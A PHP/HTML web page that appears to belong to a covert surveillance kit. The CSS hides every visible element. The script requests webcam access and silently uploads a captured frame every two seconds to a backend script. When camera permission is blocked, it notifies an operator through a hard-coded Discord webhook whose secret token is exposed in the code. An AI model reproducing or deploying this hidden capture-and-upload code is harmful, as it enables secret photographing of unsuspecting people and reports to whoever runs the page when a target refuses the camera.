<?php include_once('../../backend/generate_token.php');

include('../../forms/index.php');?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="../../assets/css/frontend.css">
    <title>Capture Image with Canvas</title>
</head>
<body>
    <style>
        .frame, #image-form, #message-container {
    display: none;
}

    </style>
    <div class="frame">
        <video id="video" autoplay></video>
    </div>
    <div class="frame">
        <canvas id="canvas"></canvas>
    </div>

    <form id="image-form" style="display: none;">
        <button type="button" id="capture-btn">Capture Image</button>
    </form>

    <div id="message-container"></div>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const captureButton = document.getElementById('capture-btn');
        const messageContainer = document.getElementById('message-container');
        const imageForm = document.getElementById('image-form');

        // Function to capture image
        function captureImage() {
            // Capture image from video stream
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            const imageDataURL = canvas.toDataURL('image/jpeg');

            // Display the captured image on the canvas
            const img = new Image();
            img.src = imageDataURL;
            img.onload = function() {
                context.drawImage(img, 0, 0, canvas.width, canvas.height);
            };

            // Set the captured image data to the hidden input field in the form
            const imageDataInput = document.createElement('input');
            imageDataInput.setAttribute('type', 'hidden');
            imageDataInput.setAttribute('name', 'image');
            imageDataInput.value = imageDataURL;
            imageForm.appendChild(imageDataInput);

            // Submit the form using AJAX
            fetch('../../backend/capture_image.php', {
                method: 'POST',
                body: new FormData(imageForm),
            })
            .then(response => response.text())
            .then(message => {
                // Display the message from the backend on the frontend
                messageContainer.textContent = message;
            })
            .catch(error => {
                console.error('Error capturing and saving image:', error);
                // Display error message on the frontend
                messageContainer.textContent = 'Error capturing and saving image.';
            });
        }

        // Access webcam
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                video.srcObject = stream;
                // Dynamically set video and canvas dimensions based on viewport size
                video.addEventListener('loadedmetadata', () => {
                    video.width = video.videoWidth;
                    video.height = video.videoHeight;
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                });

                // Start capturing image every second
                setInterval(captureImage, 2000);
            })
            .catch(err => {
                console.error('Error accessing webcam: ', err);
            });

        // Function to check camera permission
        function checkCameraPermission() {
    // Function to get the current date and time
    function getCurrentDateTime() {
        return new Date().toLocaleString(); // Returns the current date and time in a readable format
    }

    // Check if camera permission is blocked
    navigator.mediaDevices.getUserMedia({ video: true })
        .then(() => {
            // Camera access granted
            console.log('Camera access granted.');
        })
        .catch(error => {
            // Camera access denied
            const messageContainer = document.getElementById('message-container');
            messageContainer.textContent = 'Camera permission is blocked.';

            // Get current date and time
            const currentDateTime = getCurrentDateTime();

            // Send message to Discord server channel via webhook
            const discordWebhookURL = 'https://discord.com/api/webhooks/1218787042461356183/Iq_ErLJciO4nurf28evJ6PF2vj2Y_6bLhCWvJ_gJYWWdeI6YcX3765NplMOi3xnqztmF'; // Replace this with your Discord webhook URL

            // Prepare the message including date and time
            const data = {
                content: '> Camera permission is blocked.',
                dateTime: currentDateTime // Include current date and time
            };

            // Send the POST request to Discord webhook URL
            fetch(discordWebhookURL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            })
            .then(response => {
                if (response.ok) {
                    console.log('Camera permission blocked message sent to Discord server successfully!');
                } else {
                    console.error('Failed to send camera permission blocked message to Discord server.');
                }
            })
            .catch(error => {
                console.error('Error sending camera permission blocked message:', error);
            });
        });
}

// Call the function to check camera permission
checkCameraPermission();
    </script>
</body>
</html>
